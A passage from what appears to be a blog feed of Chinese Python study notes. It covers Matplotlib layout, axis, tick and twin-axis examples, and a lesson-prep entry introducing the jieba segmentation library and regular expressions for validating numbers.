punctuation">,</span>np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>axes1<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'sine'</span><span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"cosine"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="matplotlib-subplot2grid-函数详解">Matplotlib subplot2grid()函数详解</h3><p>matplotlib.pyplot 模块提供了 subplot2grid() ，该函数能够在画布的特定位置创建 axes 对象（即绘图区域）。不仅如此，它还可以使用不同数量的行、列来创建跨度不同的绘图区域。与 subplot() 和 subplots() 函数不同，subplot2gird() 函数以非等分的形式对画布进行切分，并按照绘图区域的大小来展示最终绘图结果。函数语法格式如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">plt<span class="token punctuation">.</span>subplot2grid<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> location<span class="token punctuation">,</span> rowspan<span class="token punctuation">,</span> colspan<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>shape：把该参数值规定的网格区域作为绘图区域；<br>location：在给定的位置绘制图形，初始位置 (0,0) 表示第1行第1列；<br>rowsapan/colspan：这两个参数用来设置让子区跨越几行几列。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#使用 colspan指定列，使用rowspan指定行</span>a1 <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplot2grid<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>colspan <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span>a2 <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplot2grid<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> rowspan <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span>a3 <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplot2grid<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>rowspan <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> colspan <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>a2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> x<span class="token operator">*</span>x<span class="token punctuation">)</span>a2<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'square'</span><span class="token punctuation">)</span>a1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>a1<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'exp'</span><span class="token punctuation">)</span>a3<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>a3<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>tight_layout<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/7.png" alt=""></p><h2 id="matplotlib-坐标格式">Matplotlib 坐标格式</h2><p>​       通过 Matplotlib axes 对象提供的 grid() 方法可以开启或者关闭画布中的网格（即是否显示网格）以及网格的主/次刻度。除此之外，grid() 函数还可以设置网格的颜色、线型以及线宽等属性。</p><h3 id="matplotlib-grid-设置网格格式">Matplotlib grid()设置网格格式</h3><p>grid() 的函数使用格式如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">grid<span class="token punctuation">(</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">,</span> ls <span class="token operator">=</span> <span class="token string">'-.'</span><span class="token punctuation">,</span> lw <span class="token operator">=</span> <span class="token number">0.25</span><span class="token punctuation">)</span><span class="token comment">#color：表示网格线的颜色；</span><span class="token comment">#ls：表示网格线的样式；</span><span class="token comment">#lw：表示网格线的宽度；</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>网格在默认状态下是关闭的，通过调用上述函数，网格会被自动开启，如果您只是想开启不带任何样式的网格，可以通过 grid(True) 来实现。</p><h3 id="matplotlib坐标轴格式">Matplotlib坐标轴格式</h3><p>在一个函数图像中，有时自变量 x 与因变量 y 是指数对应关系，这时需要将坐标轴刻度设置为对数刻度。Matplotlib 通过 axes 对象的xscale或yscale属性来实现对坐标轴的格式设置。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npfig<span class="token punctuation">,</span> axes <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span> x<span class="token punctuation">,</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>x<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Normal scale"</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot <span class="token punctuation">(</span>x<span class="token punctuation">,</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> x<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#设置y轴</span>axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_yscale<span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Logarithmic scale (y)"</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"x axis"</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"y axis"</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>xaxis<span class="token punctuation">.</span>labelpad <span class="token operator">=</span> <span class="token number">10</span><span class="token comment">#设置x、y轴标签</span>axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"x axis"</span><span class="token punctuation">)</span>axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"y axis"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="matplotlib坐标轴范围">Matplotlib坐标轴范围</h3><p>Matplotlib 可以根据自变量与因变量的取值范围，自动设置 x 轴与 y 轴的数值大小。当然，您也可以用自定义的方式，通过 set_xlim() 和 set_ylim() 对 x、y 轴的数值范围进行设置。当对 3D 图像进行设置的时，会增加一个 z 轴，此时使用 set_zlim() 可以对 z 轴进行设置。</p><h3 id="matplotlib刻度和刻度标签">Matplotlib刻度和刻度标签</h3><p>刻度指的是轴上数据点的标记，Matplotlib 能够自动的在 x 、y 轴上绘制出刻度。这一功能的实现得益于 Matplotlib 内置的刻度定位器和格式化器（两个内建类）。在大多数情况下，这两个内建类完全能够满足我们的绘图需求，但是在某些情况下，刻度标签或刻度也需要满足特定的要求，比如将刻度设置为“英文数字形式”或者“大写阿拉伯数字”，此时就需要对它们重新设置。<br>xticks()和yticks()函数接受一个列表对象作为参数，列表中的元素表示对应数轴上要显示的刻度ax.set_xticks([2,4,6,8,10])</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> mathx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>pi<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0.05</span><span class="token punctuation">)</span><span class="token comment">#生成画布对象</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#添加绘图区域</span>ax <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y <span class="token operator">=</span> np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>x<span class="token punctuation">)</span>ax<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token comment">#设置x轴标签</span>ax<span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span>‘angle’<span class="token punctuation">)</span>ax<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'sine'</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>set_xticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#设置x轴刻度标签</span>ax<span class="token punctuation">.</span>set_xticklabels<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'zero'</span><span class="token punctuation">,</span><span class="token string">'two'</span><span class="token punctuation">,</span><span class="token string">'four'</span><span class="token punctuation">,</span><span class="token string">'six'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#设置y轴刻度</span>ax<span class="token punctuation">.</span>set_yticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="matplotlib中文乱码解决方案-两种方式">Matplotlib中文乱码解决方案（两种方式）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Matplotlib 默认不支持中文字体，这因为 Matplotlib 只支持 ASCII 字符，但中文标注更加符合中国人的阅读习惯。因此，本节重点讲解如何在 Windows 环境下让 Matplotlib 显示中文。</span><span class="token comment">#Matplotlib中文乱码</span><span class="token comment">#当不对 Matplotlib 进行设置，而直接使用中文时，绘制的图像会出现中文乱码。下面是一个含有中文乱码的折线图：</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/8.png" alt=""></p><h4 id="重写配置文件">重写配置文件</h4><p>通过临时重写配置文件的方法，可以解决 Matplotlib 显示中文乱码的问题，代码如下所示：<br>import matplotlib.pyplot as plt<br>plt.rcParams[“font.sans-serif”]=[“SimHei”] #设置字体<br>plt.rcParams[“axes.unicode_minus”]=False #该语句解决图像中的“-”负号的乱码问题</p><h3 id="matplotlib双轴图">Matplotlib双轴图</h3><p>在一些应用场景中，有时需要绘制两个 x 轴或两个 y 轴，这样可以更直观地显现图像，从而获取更有效的数据。<code>Matplotlib</code>提供的 twinx() 和 twiny() 函数，除了可以实现绘制双轴的功能外，还可以使用不同的单位来绘制曲线，比如一个轴绘制对函数，另外一个轴绘制指数函数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment">#创建图形对象</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#添加子图区域</span>a1 <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#准备数据</span>x <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token comment">#绘制指数函数</span>a1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>a1<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'exp'</span><span class="token punctuation">)</span><span class="token comment">#添加双轴</span>a2 <span class="token operator">=</span> a1<span class="token punctuation">.</span>twinx<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#‘ro’表示红色圆点</span>a2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'ro-'</span><span class="token punctuation">)</span><span class="token comment">#绘制对数函数</span>a2<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">)</span><span class="token comment">#绘制图例</span>fig<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>labels <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'exp'</span><span class="token punctuation">,</span><span class="token string">'log'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>loc<span class="token operator">=</span><span class="token string">'upper left'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E4%BA%8C/9.png" alt=""></p><h3 id="蜘蛛图">蜘蛛图</h3><p>蜘蛛图是一种显示一对多关系的方法。<br>在蜘蛛图中，一个变量相对于另一个变量的显著性是清晰可见的。这里需要使用 Matplotlib 来进行画图，首先设置两个数组：labels 和 stats。他们分别保存了这些属性的名称和属性值。因为蜘蛛图是一个圆形，你需要计算每个坐标的角度，然后对这些数值进行设置。当画完最后一个点后，需要与第一个点进行连线。因为需要计算角度，所以我们要准备 angles 数组；又因为需要设定统计结果的数值，所以我们要设定 stats 数组。并且需要在原有 angles 和 stats 数组上增加一位，也就是添加数组的第一个元素。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python绘图及可视化备课</title>
      <link href="/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/"/>
      <url>/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/</url>
      
        <content type="html"><![CDATA[<h1>python绘图及数据可视化备课</h1><p>[TOC]</p><h2 id="补充-上次实验课的库与爬虫">补充 上次实验课的库与爬虫</h2><p>于刊老师担心我准备的内容不够讲两节课的，如果我讲完这一章的内容还没有结束的话我就讲一讲我最近捣鼓的东西</p><h3 id="1-jieba库进行词频分析">1 jieba库进行词频分析</h3><h4 id="一-jieba库基本介绍">一、jieba库基本介绍</h4><blockquote><p>jieba是优秀的中文分词第三方库，需要额外安装，安装方式为<strong>pip install jieba</strong>,jieba库提供三种分词模式，最简单只需掌握一个函数</p><p>利用一个中文词库，可以确定汉字之间的关联概率,汉字间概率大的组成词组，形成分词结果</p></blockquote><h4 id="二-jieba库使用说明">二、jieba库使用说明</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#精确模式、全模式、搜索引擎模式精确模式：</span><span class="token comment">#把文本精确的切分开，不存在冗余单词</span><span class="token comment">#全模式：把文本中所有可能的词语都扫描出来，有冗余</span><span class="token comment">#搜索引擎模式：在精确模式基础上，对长词再次切分</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>把文本精确的切分开，不存在冗余单词</p><p>全模式：把文本中所有可能的词语都扫描出来，有冗余</p><p>搜索引擎模式：在精确模式基础上，对长词再次切分</p><p><strong>jieba库常用函数</strong> <img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/1.png" alt=""></p><h3 id="2-re库进行正则匹配"><strong>2 re库进行正则匹配</strong></h3><p><strong>正则表达式（英文名称：regular expression，regex，RE）是用来简洁表达一组字符串特征的表达式。最主要应用在字符串匹配中。</strong></p><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/2.png" alt=""></p><img src="./python绘图及可视化备课/3.png"  /> <p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/4.png" alt=""></p><p>在这里需要注意，match对象是一种特殊的类型，如**re.search()<strong>与</strong>re.match()<strong>虽然也能做到类似的效果，但实际使用是有问题的，在这里使用的</strong>findall()**函数实现。</p><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/5.png" alt=""></p><img src="./python绘图及可视化备课/6.png"  /> <h5 id="校验数字的表达式">校验数字的表达式</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">数字：<span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span>$n位的数字：<span class="token operator">^</span>\d<span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span>$至少n位的数字：<span class="token operator">^</span>\d<span class="token punctuation">&#123;</span>n<span class="token punctuation">,</span><span class="token punctuation">&#125;</span>$m<span class="token operator">-</span>n位的数字：<span class="token operator">^</span>\d<span class="token punctuation">&#123;</span>m<span class="token punctuation">,</span>n<span class="token punctuation">&#125;</span>$零和非零开头的数字：<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">|</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span>$非零开头的最多带两位小数的数字：<span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>?$带<span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span>位小数的正数或负数：<span class="token operator">^</span><span class="token punctuation">(</span>\<span class="token operator">-</span><span class="token punctuation">)</span>?\d<span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span>\d<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>$正数、负数、和小数：<span class="token operator">^</span><span class="token punctuation">(</span>\<span class="token operator">-</span><span class="token operator">|</span>\<span class="token operator">+</span><span class="token punctuation">)</span>?\d<span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span>\d<span class="token operator">+</span><span class="token punctuation">)</span>?$有两位小数的正实数：<span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>?$有<span class="token number">1</span><span class="token operator">~</span><span class="token number">3</span>位小数的正实数：<span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>?$非零的正整数：<span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>$ 或 <span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span>$ 或 <span class="token operator">^</span>\<span class="token operator">+</span>?<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\<span class="token operator">*</span>$非零的负整数：<span class="token operator">^</span>\<span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span>"\<span class="token operator">*</span>$ 或 <span class="token operator">^</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>$非负整数：<span class="token operator">^</span>\d<span class="token operator">+</span>$ 或 <span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>$非正整数：<span class="token operator">^</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>$ 或 <span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>\d<span class="token operator">+</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">+</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$非负浮点数：<span class="token operator">^</span>\d<span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span>\d<span class="token operator">+</span><span class="token punctuation">)</span>?$ 或 <span class="token operator">^</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>?\<span class="token number">.0</span><span class="token operator">+</span><span class="token operator">|</span><span class="token number">0</span>$非正浮点数：<span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>\d<span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token punctuation">.</span>\d<span class="token operator">+</span><span class="token punctuation">)</span>?<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">+</span><span class="token punctuation">(</span>\<span class="token number">.0</span><span class="token operator">+</span><span class="token punctuation">)</span>?<span class="token punctuation">)</span><span class="token punctuation">)</span>$ 或 <span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token operator">|</span><span class="token number">0</span>\<span class="token punctuation">.</span>\d\<span class="token operator">*</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>\d\<span class="token operator">*</span><span class="token punctuation">)</span><span class="token 